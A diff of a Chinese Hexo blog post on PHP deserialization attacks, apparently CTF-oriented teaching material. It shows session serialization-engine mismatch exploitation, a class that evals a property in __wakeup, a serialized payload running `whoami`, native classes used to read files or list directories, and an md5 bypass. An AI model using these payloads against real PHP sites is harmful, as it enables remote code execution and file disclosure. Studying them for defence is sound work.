+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php	键名 ＋ 竖线 ＋ 经过 <span class="built_in">serialize</span>() 函数反序列处理的值</span><br><span class="line">php_binary	键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 <span class="built_in">serialize</span>() 函数反序列处理的值</span><br><span class="line">php_serialize (php&gt;=<span class="number">5.5</span>.<span class="number">4</span>)	经过 <span class="built_in">serialize</span>() 函数反序列处理的数组</span><br></pre></td></tr></table></figure>
 
 <p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。我们尝试一下</p>
 <p>PHP引擎</p>
@@ -607,10 +751,10 @@
 <p>首先来看一下session的一些相关函数</p>
 <h4 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h4><p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250417154711101.png" alt="image-20250417154711101"></p>
 <p>这里关注到一句话：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过 read 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量。</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过 <span class="built_in">read</span> 回调函数返回的现有会话数据（使用特殊的序列化格式存储）， PHP 会自动反序列化数据并且填充 <span class="variable">$_SESSION</span> 超级全局变量。</span><br></pre></td></tr></table></figure>
 
 <p>并且这个read回调函数的触发</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当会话自动开始或者通过 session_start() 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。</span><br></pre></td></tr></table></figure>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当会话自动开始或者通过 <span class="built_in">session_start</span>() 手动开始的时候， PHP 内部会调用会话处理程序的 open 和 read 回调函数。</span><br></pre></td></tr></table></figure>
 
 <p>也就是说，当会话开始时，session就会通过指定的序列化引擎将<code>$_SESSION</code>序列化。然后放入文件进行存储。那么当我们再次开启对话的时候他也会调用read()回调函数进行自动反序列化并填充<code>$_SESSION</code>，具体步骤就是</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()<span class="comment">#session_start()-&gt;读取session文件内容-&gt;反序列化</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="string">&#x27;test&#x27;</span>;<span class="comment">#序列化serialize($_SESSION)-&gt;存入文件</span></span><br></pre></td></tr></table></figure>
@@ -629,7 +773,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;test&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;请传入参数test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">请传入参数test</span><br></pre></td></tr></table></figure>
 
 <p>此时我们随便传入1，并看一下session文件的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;test&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后我们尝试对class Test进行序列化操作，反序列化会触发<code>__wakeup</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:1:&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
@@ -637,7 +781,7 @@
 <p>但是需要注意的是，在漏洞利用页面使用的是php引擎，如果我们直接传入序列化字符串的话，是并不会触发反序列化漏洞的，因为我们存储session使用的session序列化引擎是session_serialize，跟漏洞利用的引擎不同</p>
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250417162337395.png" alt="image-20250417162337395"></p>
 <p>然后我们可以注意到，当引擎是php的时候，php引擎的格式如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php	键名 ＋ | ＋ 经过 serialize() 函数反序列处理的值</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php	键名 ＋ <span class="string">| ＋ 经过 serialize() 函数反序列处理的值</span></span><br></pre></td></tr></table></figure>
 
 <p>反序列化处理的是在竖线后面的键值，那么如果我们手动构造一个竖线的话，是否可以让我们竖线后面的序列化字符串实现反序列化操作呢？</p>
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250417162552930.png" alt="image-20250417162552930"></p>
@@ -687,7 +831,7 @@
 
 <p><img src="/../image/achieve/202411/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20250417173120357.png" alt="image-20250417173120357"></p>
 <p>filename就改为我们需要传入的序列化字符串，因为页面中的序列化引擎是php，那么我们传入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;s:13:&quot;echo `whoami`&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;echo `whoami`&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>注意转义序列化数据中的双引号，或者filename&#x3D;使用单引号包裹字符串，然后还需要设置cookie，由于没有 <code>PHPSESSID</code>，PHP <strong>不会</strong> 创建或读取 Session 文件。如果我们设置PHPSESSID，由于携带了 <code>PHPSESSID</code>，PHP 会尝试读取或创建对应的 Session 文件</p>
 <p>另外，如果我们在name中传入序列化字符串也是可以的</p>
@@ -697,7 +841,7 @@
 <p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20250519094207459.png" alt="image-20250519094207459"></p>
 <p>SplFileObject 类中的fgets和fread方法都可以读文件，尽管这些方法没有参数，但是filename文件名是在类中确定的，所以直接传文件名就行</p>
 <h3 id="遍历文件目录"><a href="#遍历文件目录" class="headerlink" title="遍历文件目录"></a>遍历文件目录</h3><p>可以遍历文件目录的原生类</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator </span><br><span class="line">FilesystemIterator </span><br><span class="line">GlobIterator </span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DirectoryIterator</span> </span><br><span class="line"><span class="built_in">FilesystemIterator</span> </span><br><span class="line"><span class="built_in">GlobIterator</span> </span><br></pre></td></tr></table></figure>
 
 <p>这三个类可以遍历文件目录，也可以搭配伪协议使用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$a</span> )&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -783,164 +927,117 @@
 <p><code>Error: payload in E:\vscode\profiles\1.php:2 Stack trace: #0 &#123;main&#125;</code></p>
 <p>由于它们在同一行中被执行，若在此行代码中发生错误，错误指向的行数仅会标记为当前的行，即行号 2，这时候他们的内容完全相等，所以他们的md5值也会相等</p>
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">H0me</a></li>
-        
-          <li><a href="/about/">A6out</a></li>
-        
-          <li><a href="/tags/">T6gs</a></li>
-        
-          <li><a href="/categories/">Catagory</a></li>
-        
-          <li><a href="/links/">L1nks</a></li>
-        
-          <li><a href="/search/">s4arch</a></li>
-        
-      </ul>
     </div>
 
     
     
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.</span> <span class="toc-text">PHP反序列化是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Serialization%EF%BC%89"><span class="toc-number">1.1.</span> <span class="toc-text">序列化（Serialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88Deserialization%EF%BC%89"><span class="toc-number">1.2.</span> <span class="toc-text">反序列化（Deserialization）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%98%E5%82%A8%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">序列化存储格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B1%BB%E5%9E%8B%E6%A0%87%E5%BF%97"><span class="toc-number">1.4.</span> <span class="toc-text">常见的类型标志</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%90%E5%91%98%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.</span> <span class="toc-text">成员类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%91%98%E5%B1%9E%E6%80%A7"><span class="toc-number">2.1.</span> <span class="toc-text">成员属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.</span> <span class="toc-text">成员方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">访问控制修饰符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#serialize-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">__serialize()魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unserialize%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">__unserialize魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#construct-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">__construct()构造方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#destruct-%E6%9E%90%E6%9E%84%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">__destruct()析构方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#toString-%E6%96%B9%E6%B3%95"><span class="toc-number">3.5.</span> <span class="toc-text">__toString()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-%E6%96%B9%E6%B3%95"><span class="toc-number">3.6.</span> <span class="toc-text">__sleep()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-%E6%96%B9%E6%B3%95"><span class="toc-number">3.7.</span> <span class="toc-text">__call()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#callStatic-%E6%96%B9%E6%B3%95"><span class="toc-number">3.8.</span> <span class="toc-text">__callStatic()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-%E6%96%B9%E6%B3%95"><span class="toc-number">3.9.</span> <span class="toc-text">__get()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#set-%E6%96%B9%E6%B3%95"><span class="toc-number">3.10.</span> <span class="toc-text">__set()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#isset-%E6%96%B9%E6%B3%95"><span class="toc-number">3.11.</span> <span class="toc-text">__isset()方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#isset-%E5%87%BD%E6%95%B0"><span class="toc-number">3.11.1.</span> <span class="toc-text">isset()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unset-%E6%96%B9%E6%B3%95"><span class="toc-number">3.12.</span> <span class="toc-text">__unset()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#invoke-%E6%96%B9%E6%B3%95"><span class="toc-number">3.13.</span> <span class="toc-text">__invoke()方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wakeup-%E6%96%B9%E6%B3%95"><span class="toc-number">3.14.</span> <span class="toc-text">__wakeup()方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">反序列化攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%B8%80%EF%BC%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">5.</span> <span class="toc-text">姿势一：字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%87%A0%E5%A4%A7%E7%89%B9%E6%80%A7"><span class="toc-number">5.0.1.</span> <span class="toc-text">php反序列化的几大特性</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">5.0.2.</span> <span class="toc-text">反序列化字符逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%A2%9E%E5%A4%9A"><span class="toc-number">5.0.3.</span> <span class="toc-text">字符增多</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%87%8F%E5%B0%91"><span class="toc-number">5.0.4.</span> <span class="toc-text">字符减少</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.0.5.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF%E4%BA%8C%EF%BC%9Asession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">姿势二：session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFsession"><span class="toc-number">6.0.1.</span> <span class="toc-text">什么是session</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-session%E6%9C%BA%E5%88%B6"><span class="toc-number">6.0.2.</span> <span class="toc-text">PHP session机制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E5%AD%98%E5%82%A8"><span class="toc-number">6.0.3.</span> <span class="toc-text">session的产生和存储</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session%E5%9C%A8php-ini%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">6.0.4.</span> <span class="toc-text">session在php.ini的配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.0.5.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#session-start-%E5%87%BD%E6%95%B0"><span class="toc-number">6.0.6.</span> <span class="toc-text">session_start()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">6.0.7.</span> <span class="toc-text">攻击原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8EPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">关于PHP原生类的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">7.1.</span> <span class="toc-text">读取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%8D%E5%8E%86%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">7.2.</span> <span class="toc-text">遍历文件目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87md5-hash"><span class="toc-number">7.3.</span> <span class="toc-text">绕过md5&#x2F;hash</span></a></li></ol></li></ol>
-      </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=PHP反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=PHP反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHP反序列化&body=Check out this article: https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=PHP反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=PHP反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=PHP反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
+	
+	<div>
+	  
+		
+<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
 </div>
 
+	  
+	</div>
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>wanTh3flag
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://wanth3f1ag.top/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化">https://wanth3f1ag.top/2025/08/12/PHP反序列化/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># PHP反序列化</a>
+          </div>
+
         
-        
-<footer id="footer">
-    <div class="footer-left">
-        Copyright ©
-        
-        
-        2024-2025
-        wanTh3flag
-        <br>
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/08/12/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bypass/" rel="prev" title="PHP反序列化bypass">
+                  <i class="fa fa-angle-left"></i> PHP反序列化bypass
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/08/12/ctfshow2023%E6%84%9A%E4%BA%BA%E6%9D%AF/" rel="next" title="ctfshow2023愚人杯">
+                  ctfshow2023愚人杯 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
